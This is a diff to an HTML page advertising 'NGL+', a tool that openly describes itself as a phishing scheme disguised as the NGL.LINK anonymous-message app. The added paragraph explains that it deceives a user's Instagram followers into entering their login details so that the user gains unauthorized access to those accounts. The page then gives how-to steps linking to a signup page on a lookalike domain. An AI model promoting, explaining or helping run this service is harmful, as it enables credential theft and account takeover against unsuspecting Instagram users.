@@ -6,6 +6,11 @@
   </h3><br/><br><br>
   <h4>Video Tutorials on my instagram highlights: <a href="https://www.instagram.com/hax.gsr">@hax.gsr</a></h4>
   <br/><br/>
+  <h3>What is this tool?</h3><br>
+  <p>
+   NGL+, also known as Nefariously Generated Links, presents itself as an extension of the NGL.LINK app, a platform where users can create links to receive anonymous messages from their Instagram followers. However, this seemingly innocent facade conceals a phishing tool designed to exploit users' trust. NGL+ operates under the guise of the NGL.LINK app, leveraging the familiar interface to lure it's user's followers into a false sense of security. What sets NGL+ apart is its nefarious use of phishing techniques. Unlike the authentic NGL.LINK, NGL+ has the capability to deceive it's user's followers into submitting their Instagram login information. This deceptive method allows the apps users to gain unauthorized access to user accounts. 😈🔗
+  </p>
+  <br><br>
   <h3>How To Use:</h3><br>
   <p>1. Visit the NGL+ signup page and enter your instagram username: <a href="https://ngliink.web.app/signup.html" target="_blank">NGL+ Signup Page</a> 🔗</p><br>
   <p>2. Click the profile picture and change it to the one belonging to your instagram profile. 📷</p><br>
